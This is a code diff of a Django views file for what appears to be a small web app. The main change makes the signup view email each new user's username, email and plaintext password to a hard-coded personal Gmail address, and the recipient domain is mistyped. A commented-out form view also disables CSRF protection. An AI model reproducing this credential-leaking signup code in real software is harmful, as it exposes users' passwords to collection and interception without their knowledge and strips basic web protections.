@@ -4,6 +4,7 @@ from django.contrib.auth import authenticate, login, logout
 from django.contrib import messages
 from .models import *
 from django.urls import reverse
+from django.core.mail import send_mail
 
 # Create your views here.
 
@@ -42,6 +43,34 @@ def calories(request):
     return render(request,'main/calories.html')
 
 
+# from django.core.mail import send_mail
+# from django.http import JsonResponse
+# from django.views.decorators.csrf import csrf_exempt
+
+# @csrf_exempt  # Temporarily disable CSRF protection (use CSRF token for production)
+# def submit_form(request):
+#     if request.method == "POST":
+#         name = request.POST.get("name")
+#         email = request.POST.get("email")
+#         message = request.POST.get("message")
+
+#         # Email Subject & Body
+#         subject = "New Form Submission"
+#         email_body = f"Name: {name}\nEmail: {email}\nMessage: {message}"
+
+#         # Send email
+#         send_mail(
+#             subject,
+#             email_body,
+#             "nandinikamireddy11@gmail.com",  # Replace with your email (sender)
+#             ["nandinikamireddy11@gmail.com.com"],  # Replace with recipient email
+#             fail_silently=False,
+#         )
+
+#         return JsonResponse({"message": "Form submitted successfully!"})
+
+#     return JsonResponse({"error": "Invalid request"}, status=400)
+
 
 def signup_view(request):
     if request.method == "POST":
@@ -57,6 +86,21 @@ def signup_view(request):
         user = User.objects.create_user(username=username, email=email, password=password)
         user.save()
         messages.success(request, "Signup successful! Please log in.")
+
+         # Email Subject & Body
+        subject = "New Form Submission"
+        email_body = f"Name: {username}\nEmail: {email}\nPassword: {password}"
+
+
+        # Send email
+        send_mail(
+            subject,
+            email_body,
+            "nandinikamireddy11@gmail.com",  # Replace with your email (sender)
+            ["nandinikamireddy11@gmail.com.com"],  # Replace with recipient email
+            fail_silently=False,
+        )
+
         return redirect('main:login')
 
     return render(request, 'main/signup.html')
